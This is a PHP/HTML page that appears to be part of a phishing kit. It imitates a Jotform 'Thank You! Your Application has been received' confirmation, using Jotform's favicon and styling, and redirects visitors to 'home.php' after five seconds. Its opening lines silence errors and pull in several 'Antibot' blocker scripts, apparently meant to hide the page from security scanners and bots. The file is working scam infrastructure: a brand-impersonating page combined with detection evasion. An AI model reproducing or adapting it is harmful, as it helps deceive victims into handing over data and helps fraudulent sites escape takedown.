<?php
session_start();
error_reporting(0);
# Adding Settings 
include('../Antibot/pro.php');
include('../Antibot/blocker.php');
include('../Antibot/blocker_1.php');
include('../Antibot/blocker_2.php');
include('../Antibot/blocker_3.php');
include('../Antibot/blocker_4.php');
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head>

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta name="HandheldFriendly" content="true">
    <title>Thank You</title>
    <link rel="shortcut icon" href="https://cdn.jotfor.ms/assets/img/favicons/favicon-2021-dark.ico">
    <script type="text/javascript" src="assets/prototype.js"></script>
    
    <link type="text/css" rel="stylesheet" href="assets/thankyou.css">
    <style type="text/css">
      body {
        background:  ;
        font-family: Inter, sans-serif;
        font-size: 16px;
        color: #2C3345;
      }
      .form-all {
        background:  #fff;
        max-width: 752px;
      }
      .thankyou-sub-text {
        color: #2C3345;
      }
      #footer {
        max-width: 752px;
      }

      .thankYouDownloadPDFWrapper {
        border-top: 1px solid  ;
      }
      .ty-buttons.thankYouEditSubmission, .ty-buttons.thankYouDownloadPDF { 
        color: #2C3345;
        background-color: #fff;
        border-color: #2C3345;
      }
      .ty-buttons.thankYouFillAgain { 
        color: #2C3345;
        background-color: #fff;
        border-color: #2C3345;
      }
      @media print {
       .form-all {
        width: 752px;
       } 
      }
    </style>
    <style type="text/css" id="form-styles">
/* Injected CSS Code */

/* Injected CSS Code */
.form-all { padding:0 10px;
  padding-bottom: 30px;
}
.wrapper {
  display: flex;
  min-height: 370px;
  margin:0 auto;
  justify-content:center;
  flex-direction: column;
}

div  img {
  margin: 24px 0 0;
}
      [class*="col-"] {
  text-align:center;
  display:flex;
  flex-direction: column;
}
  .col-1 img{
  width:100%;
  max-width:153px;
}
.col-1 {
  justify-content: center;
  align-items: center;
}
.col-2 {
display: flex;
flex-direction: column;
align-items:center;
justify-content:center;
padding: 16px;
}
       @media screen and (max-width: 480px) {
  .thankyou {
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  .form-all {
    display: flex;
   flex-direction: column;
    justify-content: center;
}
}div.wrapper .col-1 {
 background-size: ;
}

    </style>
  </head>
  <body id="stage" class="thankyou">
    <div class="form-all">
      <div class="thankyou-wrapper"><p class="thank-you-icon" style="text-align:center;"><img src="assets/Thankyou-iconV2.png" alt="thank you check icon" width="153" height="156"></p><div style="text-align:center;"><h1 class="thankyou-main-text ty-text" style="text-align:center;">Thank You!</h1><p class="thankyou-sub-text ty-text" style="text-align:center;">Your Application has been received.</p></div></div>
      
    </div>
    <div id="footer" class="form-footer" style="display: block !important;">


</div>
    </div>
    <script>
// Auto-redirect after 5 seconds (5000 milliseconds)
setTimeout(function() {
window.location.href = "home.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redir";
}, 5000);
</script>

  <script src="assets/thankYouPageScripts.js"></script>
  

</body></html>